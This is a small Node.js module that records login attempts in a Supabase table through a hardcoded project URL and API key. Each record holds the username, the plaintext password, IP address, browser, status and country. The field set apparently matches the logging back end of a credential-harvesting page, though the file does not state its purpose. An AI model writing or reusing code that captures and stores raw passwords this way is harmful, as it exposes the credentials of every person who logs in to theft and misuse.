const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = 'https://yayrbsvafizrldmkxtvj.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlheXJic3ZhZml6cmxkbWt4dHZqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTg0MTU0NDUsImV4cCI6MjAzMzk5MTQ0NX0.alW7sPzJLaJA_V9Ou4H7QtVotfpJQY9xqIplpr7gN4Q';

const logLoginAttempt = async (username, password, ip, browser, status, country) => {
  const supabase = createClient(supabaseUrl, supabaseKey);

  try {
    console.log(`Logging login attempt for username: ${username}, status: ${status}, country: ${country}`);
    const { data, error } = await supabase
      .from('log')
      .insert([
        {
          username: username,
          pass: password,
          time: new Date().toISOString(),
          ip: ip,
          browser: browser,
          status: status,
          country: country
        }
      ]);

    if (error) {
      throw new Error(`Fetch error: ${error.message}`);
    }

    console.log('Data inserted successfully:', data);
    return data;

  } catch (error) {
    console.error('Fetch error:', error);
    throw error;
  }
};

module.exports = logLoginAttempt;
